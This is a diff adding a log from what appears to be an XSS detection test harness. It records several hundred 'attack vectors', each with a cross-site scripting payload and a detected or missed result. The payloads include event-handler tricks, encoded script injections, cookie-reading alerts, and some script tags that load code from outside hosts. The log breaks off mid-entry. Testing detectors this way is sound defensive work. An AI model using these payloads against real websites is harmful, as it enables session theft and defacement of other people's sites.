@@ -1,0 +1,3074 @@
+ginalPayload: <button popovertarget=x>Click me</button><select ontoggle=alert(1) popover id=x>AnonKryptiQuz</select>
+✅ Detected payload: <button popovertarget=x>Click me</button><select ontoggle=alert(1) popover id=x>AnonKryptiQuz</select>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64000
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: mode=adv&offset=0&t1=exact&h1=title&c1=all&tm1=%22%3E%3Cscript+sr<br/>c%3Dhttp%3A%2F%2F101hack.freehostia.com%2Fty.js%3E%3C%2Fscript%3E&nt1=exact&nh1=news&ntm1=&f=html&la<br/>=english&ct=all&aud=all&limit=10&x=0&y=0
+✅ Detected payload: mode=adv&offset=0&t1=exact&h1=title&c1=all&tm1=%22%3E%3Cscript+sr<br/>c%3Dhttp%3A%2F%2F101hack.freehostia.com%2Fty.js%3E%3C%2Fscript%3E&nt1=exact&nh1=news&ntm1=&f=html&la<br/>=english&ct=all&aud=all&limit=10&x=0&y=0
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64001
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: EXPS=%3Cscript%3Ealert(/xss/);%3C/script%3E
+✅ Detected payload: EXPS=%3Cscript%3Ealert(/xss/);%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64002
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: <style>:target {color: red;}</style><strike id=x style="transition:color 10s" ontransitioncancel=print()></strike>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64003
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: id=%22/%3E%3Cscript%3Ealert%28%22XSS:%20Vijayendra%22%29%3C/<br/>script%3E
+✅ Detected payload: id=%22/%3E%3Cscript%3Ealert%28%22XSS:%20Vijayendra%22%29%3C/<br/>script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64004
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <div draggable="true" contenteditable>drag me</div><a ondragover=alert(1) contenteditable style=display:block>drop here</a>
+✅ Detected payload: <div draggable="true" contenteditable>drag me</div><a ondragover=alert(1) contenteditable style=display:block>drop here</a>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64005
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <div draggable="true" contenteditable>drag me</div><span ondragover=alert(1) contenteditable>drop here</span>
+✅ Detected payload: <div draggable="true" contenteditable>drag me</div><span ondragover=alert(1) contenteditable>drop here</span>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64006
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <map oncopy="alert(1)" contenteditable>test</map>
+✅ Detected payload: <map oncopy="alert(1)" contenteditable>test</map>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64007
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: cat=%3Ciframe%20src=javascript:ale<br/>rt(123)%3E&order=name
+✅ Detected payload: cat=%3Ciframe%20src=javascript:ale<br/>rt(123)%3E&order=name
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64008
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: module=ROOT&action=login.jsp<script>alert('XSS')</<br/>script>
+✅ Detected payload: module=ROOT&action=login.jsp<script>alert('XSS')</<br/>script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64009
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: searchterm=%22;%20alert(%22XSS%22);%20%3C/script%3E
+✅ Detected payload: searchterm=%22;%20alert(%22XSS%22);%20%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64010
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: f=d&mid=1189650867&LANG=US&css=xss&extcss=%22%3E%3Cimg%20src=!%20onerr<br/>or=alert(String.fromCharCode(88,115,115,101,100,32,98,121,32,66,97,98,97,99,111,110,100,97,32,61,41)<br/>)%3E%3C/img%3E
+✅ Detected payload: f=d&mid=1189650867&LANG=US&css=xss&extcss=%22%3E%3Cimg%20src=!%20onerr<br/>or=alert(String.fromCharCode(88,115,115,101,100,32,98,121,32,66,97,98,97,99,111,110,100,97,32,61,41)<br/>)%3E%3C/img%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64011
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <html onmouseover="alert(1)" style=display:block>test</html>
+✅ Detected payload: <html onmouseover="alert(1)" style=display:block>test</html>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64012
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: cat=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/scrip<br/>t%3E%27%22%3E%3Cmarquee%3E%3Ch1%3E[XSS%27D%20by%20X3R0%20|%20ProHack%20]%3C/h1%3E%3C/marquee%3E
+✅ Detected payload: cat=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/scrip<br/>t%3E%27%22%3E%3Cmarquee%3E%3Ch1%3E[XSS%27D%20by%20X3R0%20|%20ProHack%20]%3C/h1%3E%3C/marquee%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64013
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
+✅ Detected payload: <meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64014
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: mot_sh=%22%3E%3Cmarquee%3EDEAFCED%20BY%20SPONSFULL%3C%2Fmarquee<br/>%3E&page=0&limite=20&site=&option=start&launch=OK
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64015
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <style>:target {transform: rotate(180deg);}</style><header id=x style="transition:transform 2s" ontransitionrun=alert(1)></header>
+✅ Detected payload: <style>:target {transform: rotate(180deg);}</style><header id=x style="transition:transform 2s" ontransitionrun=alert(1)></header>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64016
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: %0d%0a%20<img src=1 onerror=alert(1)>
+✅ Detected payload: %0d%0a%20<img src=1 onerror=alert(1)>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64017
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: ip="><%2Fform><script+src%3Dhttp%3A%2F%2Fgooglebig.<br/>com/l.js>
+✅ Detected payload: ip="><%2Fform><script+src%3Dhttp%3A%2F%2Fgooglebig.<br/>com/l.js>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64018
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: q=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fs<br/>cript%3E
+✅ Detected payload: q=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fs<br/>cript%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64019
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: id=%3Cscript%20src=http://mygot.110mb.com/lol.js%3<br/>E%3C/script%3E
+✅ Detected payload: id=%3Cscript%20src=http://mygot.110mb.com/lol.js%3<br/>E%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64020
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: page=%22;alert('xssed');//
+✅ Detected payload: page=%22;alert('xssed');//
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64021
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: mag_search=Fucking Spamer !"><script>alert(1)</script>
+✅ Detected payload: mag_search=Fucking Spamer !"><script>alert(1)</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64022
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <center onpointerup=alert(1) style=display:block>AnonKryptiQuz</center>
+✅ Detected payload: <center onpointerup=alert(1) style=display:block>AnonKryptiQuz</center>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64023
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: owen1=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+✅ Detected payload: owen1=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64024
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: s=parca&i="><script>alert('CYBER')</script>
+✅ Detected payload: s=parca&i="><script>alert('CYBER')</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64025
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: tour="><script>alert("MaXWeL")</script>
+✅ Detected payload: tour="><script>alert("MaXWeL")</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64026
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: keywords=%22%3EHELLO%3C/a%3E%3Cscript%3Ealert('xssed');%3C/script%3E%3C!<br/>--&searchType=gen&submit=Search+wsbt.com
+✅ Detected payload: keywords=%22%3EHELLO%3C/a%3E%3Cscript%3Ealert('xssed');%3C/script%3E%3C!<br/>--&searchType=gen&submit=Search+wsbt.com
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64027
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: tfNome=%3Cscript%3Ealert%28%22xss+by+God%22%<br/>29%3B%3C%2Fscript%3E&mnCategoria=%25&btSubmit=Effettua+ricerca
+✅ Detected payload: tfNome=%3Cscript%3Ealert%28%22xss+by+God%22%<br/>29%3B%3C%2Fscript%3E&mnCategoria=%25&btSubmit=Effettua+ricerca
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64028
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: sarkici=erman%20e%22%3E%3Ch1%3Cdsander&sarki=ajdar%20diss&id=54751%&lt;br/&gt;22%3E%3Cfont%20style=font-size:70pt%3%3EWWW.MP3SES.COM%3Cbr%3EOnline%20M%FCzik%20Dinleme%3Cscript%3E&lt;br/&gt;alert(/ww.mp3ses.com/)%3C/script%3E
+✅ Detected payload: sarkici=erman%20e%22%3E%3Ch1%3Cdsander&sarki=ajdar%20diss&id=54751%<br/>22%3E%3Cfont%20style=font-size:70pt%3%3EWWW.MP3SES.COM%3Cbr%3EOnline%20M%FCzik%20Dinleme%3Cscript%3E<br/>alert(/ww.mp3ses.com/)%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64029
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <a2 oncopy=alert(1) value="AnonKryptiQuz" autofocus tabindex=1 style=display:block>AnonKryptiQuz
+✅ Detected payload: <a2 oncopy=alert(1) value="AnonKryptiQuz" autofocus tabindex=1 style=display:block>AnonKryptiQuz
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64030
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: nid=-404&badlink=/index.asp?NID=477><script>alert("ex0")</script<br/>>
+✅ Detected payload: nid=-404&badlink=/index.asp?NID=477><script>alert("ex0")</script<br/>>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64031
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <big draggable="true" ondragenter="alert(1)" style=display:block>test</big>
+✅ Detected payload: <big draggable="true" ondragenter="alert(1)" style=display:block>test</big>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64032
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: face=slave&rnum=1418'%3E%22%3E%3CSCRIPT/SRC=http://kusomiso.co<br/>m/xss.js%3E%3C/SCRIPT%3E
+✅ Detected payload: face=slave&rnum=1418'%3E%22%3E%3CSCRIPT/SRC=http://kusomiso.co<br/>m/xss.js%3E%3C/SCRIPT%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64033
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: ref="><script>alert(1);</script>&src=
+✅ Detected payload: ref="><script>alert(1);</script>&src=
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64034
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <p draggable="true" ondragleave="alert(1)" style=display:block>test</p>
+✅ Detected payload: <p draggable="true" ondragleave="alert(1)" style=display:block>test</p>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64035
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <image onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></image>
+✅ Detected payload: <image onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></image>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64036
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: rechmultia2=1&p_niveau=%27%22%3E%3C/titl<br/>e%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marqu<br/>ee%3E&p_discipline=2&p_couple_niv_dis=15
+✅ Detected payload: rechmultia2=1&p_niveau=%27%22%3E%3C/titl<br/>e%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marqu<br/>ee%3E&p_discipline=2&p_couple_niv_dis=15
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64037
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: query=aa%22%3E%3Cscript%3Ealert(/xss/)%3C/script%3E&Submit=Search
+✅ Detected payload: query=aa%22%3E%3Cscript%3Ealert(/xss/)%3C/script%3E&Submit=Search
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64038
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <a2 onmouseout="alert(1)" style=display:block>AnonKryptiQuz</a2>
+✅ Detected payload: <a2 onmouseout="alert(1)" style=display:block>AnonKryptiQuz</a2>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64039
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: action=%22%3E%3Cscript%3Ealert(/XSS/.source)%3C/script%3<br/>E
+✅ Detected payload: action=%22%3E%3Cscript%3Ealert(/XSS/.source)%3C/script%3<br/>E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64040
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <style>:target {color:red;}</style><div id=x style="transition:color 1s" ontransitionend=alert(1)></div>
+✅ Detected payload: <style>:target {color:red;}</style><div id=x style="transition:color 1s" ontransitionend=alert(1)></div>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64041
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><strong id=x style="position:absolute;" onanimationcancel="print()"></strong>
+✅ Detected payload: <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><strong id=x style="position:absolute;" onanimationcancel="print()"></strong>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64042
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: StartRec=0&Base=WEB&Form=COMP&RecPag=5&SearchTxt="><script>a<br/>lert(document.cookie)</script>
+✅ Detected payload: StartRec=0&Base=WEB&Form=COMP&RecPag=5&SearchTxt="><script>a<br/>lert(document.cookie)</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64043
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: WCI=cy07&lng="><script>alert('CYBER')</script>
+✅ Detected payload: WCI=cy07&lng="><script>alert('CYBER')</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64044
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: page=search.php&query=File+Search...<script>javascript:al<br/>ert(document.domain)</script>
+✅ Detected payload: page=search.php&query=File+Search...<script>javascript:al<br/>ert(document.domain)</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64045
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: javascript:"/*`/*\"/*' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert()//--><<sVg/onload=alert``>
+✅ Detected payload: javascript:"/*`/*\"/*' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert()//--><<sVg/onload=alert``>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64046
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: q=<marquee><h1>XSSed%20by%20fallingmidget</h1></marque<br/>e>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64047
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: SKW==%3Cscript%3Ealert(%22a.d.t%22)%3C/script%3E
+✅ Detected payload: SKW==%3Cscript%3Ealert(%22a.d.t%22)%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64048
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: url="><script>alert(/XSS/)</script>
+✅ Detected payload: url="><script>alert(/XSS/)</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64049
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: q=%3Cmarquee%3EGURUS%3C/maruqee%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64050
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: type=?type_of_search=soft&words=%22%3E%3Ciframe+src%3D%22%5<br/>C%22%3E%3C%2Fiframe%3E%3Cmarquee%3E%3Ch1%3EXssed%20by%20GoogleBig.com%3C/h1%3E%3C/marquee%3E&Search=<br/>Ricerca
+✅ Detected payload: type=?type_of_search=soft&words=%22%3E%3Ciframe+src%3D%22%5<br/>C%22%3E%3C%2Fiframe%3E%3Cmarquee%3E%3Ch1%3EXssed%20by%20GoogleBig.com%3C/h1%3E%3C/marquee%3E&Search=<br/>Ricerca
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64051
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <script src="http://code.jquery.com/jquery-1.4.4.js"></script>
+✅ Detected payload: <script src="http://code.jquery.com/jquery-1.4.4.js"></script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64052
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <data id=x tabindex=1 onbeforedeactivate=alert(1)></data><input autofocus>
+✅ Detected payload: <data id=x tabindex=1 onbeforedeactivate=alert(1)></data><input autofocus>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64053
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <br/>action=search&uri=%2Findex.html&__locale=en&query=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&page<br/>=1&index=%2Fsites%2Fterry&query2=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&startsearch=Search
+✅ Detected payload: <br/>action=search&uri=%2Findex.html&__locale=en&query=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&page<br/>=1&index=%2Fsites%2Fterry&query2=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&startsearch=Search
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64054
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <iframe id=xss / "onload=alert(/xss/)></iframe>
+✅ Detected payload: <iframe id=xss / "onload=alert(/xss/)></iframe>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64055
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: ?goto=javascript:alert(1)",
+✅ Detected payload: ?goto=javascript:alert(1)",
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64056
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: ABC<div style="x:\x20expression(javascript:alert(1)">DEF
+✅ Detected payload: ABC<div style="x:\x20expression(javascript:alert(1)">DEF
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64057
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <abbr onmouseout="alert(1)">AnonKryptiQuz</abbr>
+✅ Detected payload: <abbr onmouseout="alert(1)">AnonKryptiQuz</abbr>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64058
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <header onpointerenter=alert(1) style=display:block>AnonKryptiQuz</header>
+✅ Detected payload: <header onpointerenter=alert(1) style=display:block>AnonKryptiQuz</header>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64059
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: id=4964&function=SEARCH-OK&searchfield=%3Ciframe%20src=%22http://xs<br/>sed.com%22%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64060
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: searchText=><script>alert("xssed by<br/>Azat")</script>><script>alert("xssed by Azat")</script>
+✅ Detected payload: searchText=><script>alert("xssed by<br/>Azat")</script>><script>alert("xssed by Azat")</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64061
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: bannerid=170&zoneid=41&source=&dest=http://seymen.org
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64062
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: cv=&db="><script>alert("CYBER//FOR-FERDA")</script>
+✅ Detected payload: cv=&db="><script>alert("CYBER//FOR-FERDA")</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64063
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <html onmouseover html onmouseover="javascript:javascript:alert(9408)"></html onmouseover>
+✅ Detected payload: <html onmouseover html onmouseover="javascript:javascript:alert(9408)"></html onmouseover>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64064
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: zoom_query=sssssssss&zoom_per_page=10&zoom_and=0&zoom_sort=%22%3E%3Cs<br/>cript%3Ealert(1)%3C/script%3E
+✅ Detected payload: zoom_query=sssssssss&zoom_per_page=10&zoom_and=0&zoom_sort=%22%3E%3Cs<br/>cript%3Ealert(1)%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64065
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <shadow onbeforescriptexecute=alert(1)><script>1</script>
+✅ Detected payload: <shadow onbeforescriptexecute=alert(1)><script>1</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64066
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <input2 onkeydown="alert(1)" contenteditable style=display:block>AnonKryptiQuz</input2>
+✅ Detected payload: <input2 onkeydown="alert(1)" contenteditable style=display:block>AnonKryptiQuz</input2>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64067
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <source onpointerleave=alert(1)>XSS</source>
+✅ Detected payload: <source onpointerleave=alert(1)>XSS</source>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64068
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: type=search&lang=us&string=%3C/title%3E%22%3E%3Cscript%<br/>3Ealert('THE_MILLER')%3C/script%3E&type=text
+✅ Detected payload: type=search&lang=us&string=%3C/title%3E%22%3E%3Cscript%<br/>3Ealert('THE_MILLER')%3C/script%3E&type=text
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64069
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <s onmouseleave="alert(1)">AnonKryptiQuz</s>
+✅ Detected payload: <s onmouseleave="alert(1)">AnonKryptiQuz</s>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64070
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <shadow oncopy=alert(1) value="AnonKryptiQuz" autofocus tabindex=1 style=display:block>AnonKryptiQuz
+✅ Detected payload: <shadow oncopy=alert(1) value="AnonKryptiQuz" autofocus tabindex=1 style=display:block>AnonKryptiQuz
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64071
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: cat_name="><script>alert('TreX')</script><h1>Hacked%20By<br/>%20TreX</h1>
+✅ Detected payload: cat_name="><script>alert('TreX')</script><h1>Hacked%20By<br/>%20TreX</h1>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64072
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: q=%27%7D+%3B+alert(document.cookie);%3C%2Fscript%3E
+✅ Detected payload: q=%27%7D+%3B+alert(document.cookie);%3C%2Fscript%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64073
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <rtc onmousedown="alert(1)" style=display:block>AnonKryptiQuz</rtc>
+✅ Detected payload: <rtc onmousedown="alert(1)" style=display:block>AnonKryptiQuz</rtc>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64074
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: q=%22%3E%3Cscript%3Ealert('xssed');%3C/script%3E%3Cspan%20id=%2<br/>2&c=1&s=Search
+✅ Detected payload: q=%22%3E%3Cscript%3Ealert('xssed');%3C/script%3E%3Cspan%20id=%2<br/>2&c=1&s=Search
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64075
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: konum="><script>alert("MaXWeL")</scri<br/>pt>
+✅ Detected payload: konum="><script>alert("MaXWeL")</scri<br/>pt>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64076
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: q=%22%3E%3Cscript%3Ealert%280%29%3C%2Fscript%3E&w=reviews
+✅ Detected payload: q=%22%3E%3Cscript%3Ealert%280%29%3C%2Fscript%3E&w=reviews
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64077
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: page="><script>alert(document.cookie)</script><h1>ww<br/>w.raptr.us.tc</h1>
+✅ Detected payload: page="><script>alert(document.cookie)</script><h1>ww<br/>w.raptr.us.tc</h1>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64078
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <main onkeyup="alert(1)" contenteditable>AnonKryptiQuz</main>
+✅ Detected payload: <main onkeyup="alert(1)" contenteditable>AnonKryptiQuz</main>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64079
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: cmd=search
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64080
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: mainQ=http://dyrenett.no/no/s/bok.asp?art=%2<br/>2%3E%3Cbody+onload=alert(%22By%20Encore%22)%3E%3Cmarquee%3E%3Ch1%3EUNUTAMADIM%20:(%20%20%20%3C/h1%3E<br/>%3Ch2%3E%20By%20Encore%20%3C/h2%3E
+✅ Detected payload: mainQ=http://dyrenett.no/no/s/bok.asp?art=%2<br/>2%3E%3Cbody+onload=alert(%22By%20Encore%22)%3E%3Cmarquee%3E%3Ch1%3EUNUTAMADIM%20:(%20%20%20%3C/h1%3E<br/>%3Ch2%3E%20By%20Encore%20%3C/h2%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64081
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: searchString=asdffdsa%3Cscr<br/>ipt%3Ealert(1337)%3C/script%3E&micrositeId=MS_PERSONALFINANCE_1_1&locale=LA_eng_US&usemicrosite=true<br/>&evaluateRF=true
+✅ Detected payload: searchString=asdffdsa%3Cscr<br/>ipt%3Ealert(1337)%3C/script%3E&micrositeId=MS_PERSONALFINANCE_1_1&locale=LA_eng_US&usemicrosite=true<br/>&evaluateRF=true
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64082
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: modul=9_2&lang=tr&ID="<script>alert("HACKED")</script>
+✅ Detected payload: modul=9_2&lang=tr&ID="<script>alert("HACKED")</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64083
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: &lt;/script&gt;&lt;svg/pnload=prompt(1)&gt;
+✅ Detected payload: </script><svg/pnload=prompt(1)>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64084
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <rtc draggable="true" ondragend="alert(1)">test</rtc>
+✅ Detected payload: <rtc draggable="true" ondragend="alert(1)">test</rtc>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64085
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <svg onload="alert(1)"></svg>
+✅ Detected payload: <svg onload="alert(1)"></svg>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64086
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: msg_erro=OMG');%20alert('is%20that%20you%20Jesus<br/>???&user=&passwd=&redir=&ID=pucspbv
+✅ Detected payload: msg_erro=OMG');%20alert('is%20that%20you%20Jesus<br/>???&user=&passwd=&redir=&ID=pucspbv
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64087
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: dic_where=medic&query_utf=%22%3E%3CSCRIPT%20SRC=http://ha.ckers.or<br/>g/xss.js%3E%3C/SCRIPT%3E
